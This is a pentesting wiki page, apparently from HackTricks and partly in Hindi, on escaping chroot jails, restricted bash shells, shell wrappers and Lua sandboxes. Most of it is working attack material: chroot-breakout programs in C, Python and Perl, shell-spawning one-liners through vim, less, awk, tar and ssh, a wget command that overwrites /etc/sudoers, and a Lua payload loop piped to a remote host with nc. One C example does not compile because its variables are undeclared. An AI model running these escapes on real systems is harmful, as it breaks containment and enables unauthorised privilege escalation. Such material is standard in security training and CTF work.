# Jails से बचना

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**Search in** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **if you can execute any binary with "Shell" property**

## Chroot Escapes

From [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): The chroot mechanism is **not intended to defend** against intentional tampering by **privileged** (**root**) **users**. On most systems, chroot contexts do not stack properly and chrooted programs **with sufficient privileges may perform a second chroot to break out**.\
Usually this means that to escape you need to be root inside the chroot.

> [!TIP]
> The **tool** [**chw00t**](https://github.com/earthquake/chw00t) was created to abuse the following escenarios and scape from `chroot`.

### Root + CWD

> [!WARNING]
> If you are **root** inside a chroot you **can escape** creating **another chroot**. This because 2 chroots cannot coexists (in Linux), so if you create a folder and then **create a new chroot** on that new folder being **you outside of it**, you will now be **outside of the new chroot** and therefore you will be in the FS.
>
> This occurs because usually chroot DOESN'T move your working directory to the indicated one, so you can create a chroot but e outside of it.

Usually you won't find the `chroot` binary inside a chroot jail, but you **could compile, upload and execute** a binary:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

> [!WARNING]
> यह पिछले case जैसा है, लेकिन इस case में **attacker वर्तमान directory का एक file descriptor store करता है** और फिर **chroot को एक नए folder में create करता है**। अंत में, क्योंकि उसके पास chroot के **outside** उस **FD** तक **access** है, वह उसे access करता है और **escapes**।

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD को Unix Domain Sockets के जरिए पास किया जा सकता है, इसलिए:
>
> - एक child process (fork) बनाएं
> - UDS बनाएं ताकि parent और child बात कर सकें
> - child process में chroot को एक अलग folder में चलाएं
> - parent proc में, एक folder का FD बनाएं जो नए child proc chroot के बाहर हो
> - उस FD को UDS का उपयोग करके child procc को पास करें
> - child process उस FD पर chdir करे, और क्योंकि यह उसके chroot के बाहर है, वह jail से बाहर निकल जाएगा

### Root + Mount

> [!WARNING]
>
> - root device (/) को chroot के अंदर एक directory में mount करना
> - उस directory में chroot करना
>
> Linux में यह संभव है

### Root + /proc

> [!WARNING]
>
> - procfs को chroot के अंदर एक directory में mount करें (अगर यह पहले से नहीं है)
> - ऐसे pid की तलाश करें जिसका root/cwd entry अलग हो, जैसे: /proc/1/root
> - उस entry में chroot करें

### Root(?) + Fork

> [!WARNING]
>
> - एक Fork (child proc) बनाएं और FS में और गहराई में एक अलग folder में chroot करें और उस पर CD करें
> - parent process से, वह folder जिसमें child process है, उसे बच्चों के chroot से पहले वाले folder में ले जाएं
> - यह children process खुद को chroot के बाहर पाएगा

### ptrace

> [!WARNING]
>
> - पहले users अपने ही processes को process of itself से debug कर सकते थे... लेकिन अब by default यह संभव नहीं है
> - फिर भी, अगर यह संभव हो, तो आप एक process में ptrace कर सकते हैं और उसके अंदर shellcode execute कर सकते हैं ([see this example](linux-capabilities.md#cap_sys_ptrace)).

## Bash Jails

### Enumeration

जेल के बारे में info प्राप्त करें:
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### PATH को Modify करें

जांचें कि क्या आप PATH env variable को modify कर सकते हैं
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### vim का उपयोग करना
```bash
:set shell=/bin/sh
:shell
```
### Pagers and help viewers

कई restricted environments अभी भी **pagers** या **help viewers** उपलब्ध छोड़ देते हैं। इन्हें आमतौर पर `PATH` को फिर से rebuild करने की कोशिश से ज्यादा तेजी से abuse किया जा सकता है।
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
यदि `git` उपलब्ध है, तो याद रखें कि उसका help output आमतौर पर एक pager से होकर जाता है:
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### Common GTFOBins one-liners

एक बार जब आप जान लेते हैं कि कौन-सी binaries reachable हैं, तो पहले obvious shell spawners को test करें:
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
यदि आप केवल एक allowed command में **arguments inject** कर सकते हैं (इसके बजाय कि उसे freely run करें), तो **GTFOArgs** भी check करें।

### Create script

देखें कि क्या आप _/bin/bash_ को content के रूप में रखकर एक executable file बना सकते हैं
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### SSH से bash प्राप्त करें

यदि आप ssh के जरिए एक्सेस कर रहे हैं, तो आप अक्सर server से restricted login shell के बजाय एक **different program** execute करने के लिए कह सकते हैं:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
यदि `ssh` कुछ ही locally allowed binaries में से एक है, तो याद रखें कि इसे **GTFOBin** के रूप में भी abused किया जा सकता है:
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### घोषित करें
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

आप उदाहरण के लिए sudoers file को overwrite कर सकते हैं
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Restricted shell wrappers (`git-shell`, `rssh`, `lshell`)

कुछ environments आपको plain `rbash` में नहीं, बल्कि **wrappers** जैसे `git-shell`, `rssh`, या `lshell` में डालते हैं:

- `git-shell` सिर्फ server-side Git commands और `~/git-shell-commands/` के अंदर मौजूद किसी भी चीज़ को स्वीकार करता है। अगर वह directory मौजूद है, तो allowed custom actions को enumerate करने के लिए `help` चलाएँ। अगर आप वहाँ **write** कर सकते हैं, तो उस directory में dropped कोई भी executable reachable हो जाता है।
- `rssh` / `lshell` आमतौर पर सिर्फ `scp`, `sftp`, `rsync`, या Git-style operations allow करते हैं। ऐसे cases में पहले **file write primitives** पर ध्यान दें: `authorized_keys`, shell startup file, या helper script को writable location में upload करें और फिर `ssh -t ...` के साथ reconnect करें।
- अगर wrapper सिर्फ command line को filter करता है, तो reachable binaries enumerate करें और फिर **GTFOBins / GTFOArgs** पर pivot करें।

### Other tricks

Also check:

- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**It could also be interesting the page:**

{{#ref}}
../bypass-bash-restrictions/
{{#endref}}

## Python Jails

Tricks about escaping from python jails in the following page:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

In this page you can find the global functions you have access to inside lua: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)

**Eval with command execution:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
कुछ tricks to **call functions of a library without using dots**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
किसी library के functions enumerate करें:
```bash
for k,v in pairs(string) do print(k,v) end
```
ध्यान दें कि हर बार जब आप पिछला one liner किसी **different lua environment** में execute करते हैं, तो functions का order बदल जाता है। इसलिए यदि आपको कोई specific function execute करनी हो, तो आप different lua environments load करके और le library के first function को call करके brute force attack कर सकते हैं:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**इंटरैक्टिव lua shell प्राप्त करें**: अगर आप एक सीमित lua shell के अंदर हैं, तो आप यह कॉल करके एक नया lua shell (और उम्मीद है unlimited) प्राप्त कर सकते हैं:
```bash
debug.debug()
```
## References

- [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Slides: [https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions\_-_Bucsay_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf))
- [https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [https://git-scm.com/docs/git-shell](https://git-scm.com/docs/git-shell)

{{#include ../../banners/hacktricks-training.md}}
